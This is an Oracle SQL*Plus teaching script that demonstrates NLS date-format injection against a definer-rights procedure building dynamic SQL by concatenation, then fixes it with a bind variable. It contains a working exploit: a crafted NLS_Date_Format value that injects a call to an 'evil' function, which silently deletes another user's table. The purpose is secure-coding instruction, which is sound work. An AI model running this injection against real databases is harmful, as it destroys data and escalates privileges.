rem nls.sql
rem
rem (c) 2009 Oracle Corporation
rem
rem Author: Bridesmaid
rem
rem Example of an NLS injection and two possible solutions

set echo on

rem Setup the test users

CONNECT / AS SYSDBA
SET SQLTERMINATOR OFF
SET SERVEROUTPUT ON
ALTER SYSTEM SET Plsql_Warnings = 'Enable:All'
/

DROP USER testuser CASCADE
/
CREATE USER testuser IDENTIFIED BY testuser
/
GRANT CONNECT, RESOURCE TO testuser
/

DROP USER eviluser CASCADE
/
CREATE USER eviluser IDENTIFIED BY eviluser
/
GRANT CONNECT, RESOURCE TO eviluser
/

rem
rem Create the routine we will attack
rem

CONNECT testuser/testuser
SET SQLTERMINATOR OFF
SET SERVEROUTPUT ON

rem create a test table containing a date

CREATE TABLE t (a NUMBER, d DATE)
/
rem Insert some data into the table

DECLARE
  Fmt CONSTANT VARCHAR2(80) := 'yyyy-mm-dd hh24:mi:ss';
BEGIN
  INSERT INTO t(a, d) VALUES(1, To_Date('2008-09-23 17:30:00', Fmt));
  INSERT INTO t(a, d) VALUES(2, To_Date('2008-09-21 17:30:00', Fmt));
  COMMIT;
END;
/

CREATE OR REPLACE PROCEDURE p AUTHID DEFINER AS 
	q CONSTANT VARCHAR2(1) := '''';
	d CONSTANT DATE :=
		TO_DATE('2008-09-22 17:30:00','yyyy-mm-dd hh24:mi:ss');
	stmt CONSTANT VARCHAR2(32767) :=
		'SELECT COUNT(*) FROM t WHERE t.d > '||q||d||q;
	n NUMBER;
BEGIN
	EXECUTE IMMEDIATE stmt INTO n;
	DBMS_OUTPUT.PUT_LINE(n||' rows');
END p;
/
show errors
GRANT EXECUTE ON p TO PUBLIC
/

rem Now test our routine

BEGIN p(); END;
/

rem One row is returned as expected.

rem Now logon as an evil user

CONNECT eviluser/eviluser
SET SQLTERMINATOR OFF
SET SERVEROUTPUT ON

rem test the call to the victim routine
BEGIN testuser.p(); END;
/

rem One row is returned as expected.

rem Now let us try and vary the result

ALTER SESSION SET NLS_Date_Format='yyyy'
/
BEGIN testuser.p(); END;
/

rem Now we see that two rows are returned! Clearly the routine
rem contains a bug. 
rem
rem But is it exploitable?
rem
rem Let us create an evil function

-- Supress PLW-06009:
-- procedure "EVIL" OTHERS handler does not END in RAISE or RAISE_APPLICATION_ERROR
-- Because we're evil, we want silently to swallow any error that might occur.
-- Normally, of course, this is bad practice.
ALTER SESSION SET Plsql_Warnings = 'Enable:All, Disable:06009'
/

CREATE OR REPLACE FUNCTION EVIL RETURN NUMBER AUTHID CURRENT_USER IS
	pragma Autonomous_Transaction;
BEGIN
	BEGIN
		DBMS_OUTPUT.PUT_LINE('In Evil()!');
		-- testuser.t is not in scope when we
		-- compile so needs to be hidden
		-- in an execute immediate
		EXECUTE IMMEDIATE 'delete from testuser.t';
    		COMMIT;
	EXCEPTION
		WHEN OTHERS THEN NULL;
	END;
	RETURN 1;
END;
/
show errors
-- Restore the normal regime
ALTER SESSION SET Plsql_Warnings = 'Enable:All'
/
GRANT EXECUTE ON evil TO PUBLIC
/
rem Now try and change the NLS format to include our evil function

ALTER SESSION SET NLS_Date_Format='"'' AND eviluser.evil()=1--"'
/
rem Let us see what happens

BEGIN testuser.p(); END;
/
rem Yes! It is exploitable. We have executed our function and deleted
rem the contents of the table.


rem So how can we fix this....

connect testuser/testuser
SET SQLTERMINATOR OFF
SET SERVEROUTPUT ON
-- First, confirm that evil was done.

SELECT Count(*) "Count(*) FROM t" FROM t
/
-- So, we'd better re-instate the evilly deleted data so that we can retest.
DECLARE
  Fmt CONSTANT VARCHAR2(80) := 'yyyy-mm-dd hh24:mi:ss';
BEGIN
  INSERT INTO t(a, d) VALUES(1, To_Date('2008-09-23 17:30:00', Fmt));
  INSERT INTO t(a, d) VALUES(2, To_Date('2008-09-21 17:30:00', Fmt));
  COMMIT;
END;
/

rem We should see if we can use a bind argument. Let us recode the routine

-- c changed to n
CREATE OR REPLACE PROCEDURE p AUTHID DEFINER AS
	n NUMBER;
	d CONSTANT DATE := To_Date('2008-09-22 17:30:00','yyyy-mm-dd hh24:mi:ss');
	stmt CONSTANT VARCHAR2(32767) := 
		'select count(*) from t where t.d > :1';
BEGIN
	EXECUTE IMMEDIATE STMT INTO n USING d;
	DBMS_OUTPUT.PUT_LINE(n||' rows');
END;
/
show errors

rem Let us test the routine

BEGIN testuser.p(); END;
/

rem It works! One row as expected

rem Now let us repeat the attacks

CONNECT eviluser/eviluser
SET SQLTERMINATOR OFF
SET SERVEROUTPUT ON

rem test the call to the victim routine

BEGIN testuser.p(); END;
/

rem One row is returned as expected.

rem Now lets try and vary the result

ALTER SESSION SET NLS_Date_Format='yyyy'
/
BEGIN testuser.p(); END;
/

rem Our attack has failed. We get one row still

rem Now try and change the NLS format to include our evil function

ALTER SESSION SET NLS_Date_Format='"'' AND eviluser.evil()=1--"'
/
rem Lets see what happens

BEGIN testuser.p(); END;
/

rem And again our attack has failed and we get one row.
